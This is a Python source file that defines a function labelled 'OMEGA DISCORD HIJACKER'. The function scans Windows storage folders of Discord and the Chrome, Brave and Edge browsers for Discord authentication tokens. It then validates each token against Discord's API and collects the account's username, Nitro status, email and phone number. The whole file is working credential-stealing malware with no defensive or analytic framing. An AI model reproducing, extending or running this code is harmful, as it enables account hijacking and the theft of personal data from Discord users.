import os, json, base64, shutil

def steal_discord():
    """
    Extracts Discord tokens from common local storage locations.
    """
    results = ["--- OMEGA DISCORD HIJACKER ---"]
    
    paths = {
        "Discord": os.path.expanduser("~") + r"\AppData\Roaming\discord\Local Storage\leveldb",
        "Discord Canary": os.path.expanduser("~") + r"\AppData\Roaming\discordcanary\Local Storage\leveldb",
        "Discord PTB": os.path.expanduser("~") + r"\AppData\Roaming\discordptb\Local Storage\leveldb",
        "Google Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
    }

    tokens = []
    
    for name, path in paths.items():
        if not os.path.exists(path): continue
        
        try:
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"): continue
                
                with open(os.path.join(path, file_name), errors="ignore") as f:
                    content = f.read()
                    import re
                    # Standard token regex
                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", content):
                        if token not in tokens:
                            tokens.append(token)
        except: pass

    if not tokens:
        return "No Discord tokens found."
    
    results.append(f"Found {len(tokens)} unique tokens. Validating...\n")
    
    import urllib.request
    for t in tokens:
        info = "[Invalid/Expired]"
        try:
            req = urllib.request.Request("https://discord.com/api/v9/users/@me", headers={"Authorization": t, "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                data = json.loads(r.read().decode())
                user = f"{data['username']}#{data['discriminator']}" if 'discriminator' in data else data['username']
                nitro = "Yes" if data.get("premium_type", 0) > 0 else "No"
                email = data.get("email") or "N/A"
                phone = data.get("phone") or "N/A"
                info = f"User: {user} | Nitro: {nitro} | Email: {email} | Phone: {phone}"
        except:
            pass
        results.append(f"  [+] {t[:30]}... | {info}")
        
    return "\n".join(results)
